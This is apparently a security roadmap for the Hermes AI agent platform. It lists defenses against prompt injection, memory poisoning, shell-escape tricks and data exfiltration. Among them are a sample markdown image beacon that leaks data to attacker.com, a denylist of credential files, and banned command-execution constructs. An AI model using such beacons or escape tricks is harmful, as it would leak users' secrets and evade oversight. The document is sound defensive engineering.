# Hermes Guardrail Hardening Roadmap & Action Plan

This plan organizes the security hardening of the Hermes Agent Platform into 6 distinct, prioritized phases based on risk reduction per unit of effort.

---

## Phase 0: Foundations (Completed)
- [x] **Threat Model**: Documented trust boundaries, assets, attacker capabilities, and deployment modes in `docs/threat_model.md`.
- [x] **Git Tracking**: Initialized repository version control to enable baseline commits and branch audits.
- [x] **Central Audit Logger** (`src/security/audit.py`): Structured append-only JSON logging of every tool call, arguments, policy outcome, reason, session ID, and timestamp with secret redaction.
- [x] **Adversarial Test Suite** (`tests/security/`): Dedicated security test directory testing evasion, injection, exfiltration, and chunk-boundary bypasses.

---

## Phase 1: Sandbox & Terminal Execution Hardening
- [x] **Strict Shell Construct Rejection**:
  - Reject dangerous bash features: command substitutions (`$(...)`, `` `...` ``), process substitution (`<(...)`, `>(...)`), heredocs (`<<`), newlines within commands, and `$'...'` escape syntax.
- [x] **Allowlist Tool Semantic Hardening**:
  - Deny command-execution options inside allowlisted binaries: `find -exec`, `xargs`, `awk 'system(...)'`, `git -c`, `git config`.
  - Route `pytest` through container sandbox only (since `conftest.py` executes arbitrary python).
- [x] **Credential & Path Denylist**:
  - Strictly deny reading or modifying `.env`, `.git/config`, `*.pem`, `id_rsa*`, `id_ed25519*`, `*.key`.
  - Canonicalize paths using `Path.resolve()` to prevent symlink traversal out of `workspace/`.
- [ ] **Container Isolation Defaults (Infrastructure)**:
  - Docker container execution with `--cap-drop=ALL`, `--read-only`, scratch `tmpfs` `/tmp`, network egress allowlist.

---

## Phase 2: Prompt Injection and Exfiltration Defense
- [x] **Untrusted Content Wrapping** (`src/security/untrusted.py`):
  - Ingest web search results, file contents, and MCP server outputs inside protected delimiter blocks (`<untrusted_content_data>`).
  - Escape closing delimiter tags inside raw text to prevent delimiter injection.
- [x] **Taint Tracking**:
  - Mark turn state as `is_tainted=True` whenever external untrusted content is ingested.
  - Require explicit human confirmation for any mutating or outbound tool call executed while tainted.
- [x] **Outbound URL & Data Exfiltration Policy**:
  - Strip or flag markdown image beacons (`![beacon](https://attacker.com/leak?data=...)`).
  - Detect high-entropy or abnormally long query strings in generated URLs.

---

## Phase 3: Approvals, Credentials, and Budgets
- [x] **Action Risk Classification**:
  - Categorize actions as `READ`, `REVERSIBLE_WRITE`, or `IRREVERSIBLE` (delete, send, pay, push, deploy).
  - Enforce Human-in-the-Loop (HITL) approval for all `IRREVERSIBLE` operations with exact parameter inspection.
- [ ] **Scoped Tool Credentials**:
  - Inject short-lived, least-privilege tokens only at tool execution time, keeping them out of LLM prompts.
- [ ] **Loop Detection & Task Budgets**:
  - Enforce limits on max tool calls per task, max tokens, and wall-clock timeout.
  - Detect identical repeated tool calls in loop.

---

## Phase 4: Guardrail Hardening
- [x] **Claim-to-Source Grounding**:
  - Flag and qualify unsupported claims with visible warning badges rather than silently rewriting prose.
  - Support quote-span grounding verification against source content.
- [x] **Memory Poisoning & Authorization Defense**:
  - Enforce at the policy engine level that memories with `can_authorize_tools=False` cannot bypass safety gates.
  - Conservative contradiction handling: retain both memories with contradiction flags for user review.
- [x] **SSE Streaming Redaction Hardening**:
  - Exact-match redaction of all environment variables and API keys loaded in memory.
  - High-entropy secret token detection (Shannon entropy).
  - Buffer sliding window resilience against split secrets across chunk boundaries.

---

## Phase 5: Verification & Continuous Assurance
- [x] **Adversarial Test Suite Execution**:
  - Automated tests for command obfuscation, multi-chunk secret leaking, prompt injection, and credential access denial.
- [ ] **Continuous Fuzzing & Red-Teaming**:
  - Automated fuzz testing of parsers and secret scanners.
  - Target false-positive rate under 2% on legitimate benchmark tasks.
